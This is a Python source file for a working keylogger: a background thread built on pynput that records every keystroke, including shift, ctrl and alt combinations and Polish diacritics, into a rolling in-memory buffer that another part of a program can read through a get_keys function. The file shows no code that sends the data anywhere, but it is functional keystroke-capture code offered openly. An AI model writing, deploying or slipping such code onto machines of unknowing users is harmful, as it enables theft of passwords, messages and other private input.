import logging as log
from threading import Thread

from pynput.keyboard import Listener, Key

DB_CAPACITY = 2000

database = ''

shift = [Key.shift_r, Key.shift_l, Key.shift]
alt_r = [Key.alt_r]
alt_l = [Key.alt_l]
ctrl = [Key.ctrl_l, Key.ctrl_r, Key.ctrl]

accepted_keys = {Key.space: ' ', Key.enter: '\n', Key.backspace: '<b>',
                 Key.tab: '<tab>', Key.cmd: '<win>', Key.esc: '<esc>'}
polish_chars = {'a': 'ą', 'c': 'ć', 'e': 'ę', 'l': 'ł', 'n': 'ń', 'o': 'ó', 's': 'ś', 'z': 'ż', 'x': 'ź'}
specials = {'1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
            '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', '\'': '\"', ',': '<', '.': '>', '/': '?'}

shift_pressed = False
alt_r_pressed = False
alt_l_pressed = False
ctrl_pressed = False


def get_keys():
    global database
    return database


def keypress(key):
    global specials, shift_pressed, alt_r_pressed, alt_l_pressed, ctrl_pressed, database

    if key in shift:
        shift_pressed = True
    if key in alt_r:
        alt_r_pressed = True
    if key in alt_l:
        alt_l_pressed = True
    if key in ctrl:
        ctrl_pressed = True

    try:
        c = str(key.char)
        if shift_pressed and not alt_r_pressed and not alt_l_pressed:
            if c in specials:
                c = specials[c]
            else:
                if ctrl_pressed:
                    c = 'shift+{}'.format(c)
                else:
                    c = c.upper()

        if not shift_pressed and (alt_r_pressed or alt_l_pressed):
            if ctrl_pressed:
                if c in polish_chars:
                    c = polish_chars[c]
                else:
                    c = ''
            else:
                c = '<alt+{}>'.format(c)

        if alt_r_pressed and shift_pressed:
            if c in polish_chars:
                c = polish_chars[c].upper()
            else:
                c = ''

        if alt_l_pressed and shift_pressed:
            if ctrl_pressed:
                c = polish_chars[c].upper()
            else:
                c = '<alt+shift+{}>'.format(c)

        if ctrl_pressed and not alt_r_pressed and not alt_l_pressed:
            c = '<ctrl+{}>'.format(c)

        log.debug('Key pressed: {}'.format(key))
        if not c == '' and key.char is not None:
            database += c
            log.debug('Added: {}'.format(c))

    except AttributeError:
        if key == Key.tab and ctrl_pressed:
            c = '<ctrl+tab>'
        elif key == Key.tab and alt_l_pressed:
            c = '<alt+tab>'
        elif key in accepted_keys:
            c = accepted_keys[key]
        else:
            c = ''

        log.debug('Key pressed*: {}'.format(key))
        if not c == '' and c is not None:
            database += c
            log.debug('Added*: {}'.format(c))


def keyrelease(key):
    global shift_pressed, alt_r_pressed, alt_l_pressed, ctrl_pressed, database, DB_CAPACITY
    if key in shift:
        shift_pressed = False
    if key in alt_r:
        alt_r_pressed = False
    if key in alt_l:
        alt_l_pressed = False
    if key in ctrl:
        ctrl_pressed = False

    if len(database) > DB_CAPACITY + (DB_CAPACITY * 0.1):
        database = database[-DB_CAPACITY:]


class Keylogger(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        with Listener(on_press=keypress, on_release=keyrelease) as listener:
            listener.join()


def start_key_listener():
    Keylogger().start()
